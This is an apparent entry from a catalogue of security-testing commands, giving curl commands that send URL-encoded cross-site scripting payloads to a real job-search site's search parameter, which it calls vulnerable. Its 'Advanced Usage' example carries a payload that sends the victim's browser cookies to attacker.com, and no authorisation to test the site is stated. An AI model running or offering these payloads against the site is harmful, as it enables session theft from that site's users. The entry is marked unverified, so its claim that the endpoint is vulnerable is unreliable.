---
id: cmd-curl-xss-test
data: >-
  curl
  "https://www.glassdoor.com/Job/jobs.htm?sc.keyword=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
tags:
  - xss
  - testing
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.571Z'
verified: false
validated: true
submitted: true
---
# curl-test-xss-payload

## Command

```bash
curl "https://www.glassdoor.com/Job/jobs.htm?sc.keyword=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
```

## Description

This command uses curl to send a GET request to the vulnerable Glassdoor endpoint with a URL-encoded XSS payload in the sc.keyword parameter, simulating the delivery of malicious input to test for DOM-based reflection and execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The target endpoint with encoded payload | Yes |
| `--silent` (optional) | Suppress progress meter | No |

## Examples

### Basic Usage

```bash
curl "https://www.glassdoor.com/Job/jobs.htm?sc.keyword=test"
```

### Advanced Usage

```bash
curl -v "https://www.glassdoor.com/Job/jobs.htm?sc.keyword=%3Cscript%3Efetch('http://attacker.com?data='+btoa(document.cookie))%3C%2Fscript%3E" --output response.html
```

## Expected Output

The command returns the HTML response of the page. Inspect the output for the reflected payload (e.g., <script>alert('XSS')</script>) without sanitization. In a browser context, this would trigger JS execution; here, it aids in verification.

## Related

- [[Related Procedure|procedures/Exploit-DOM-based-XSS-in-URL-Parameter]]
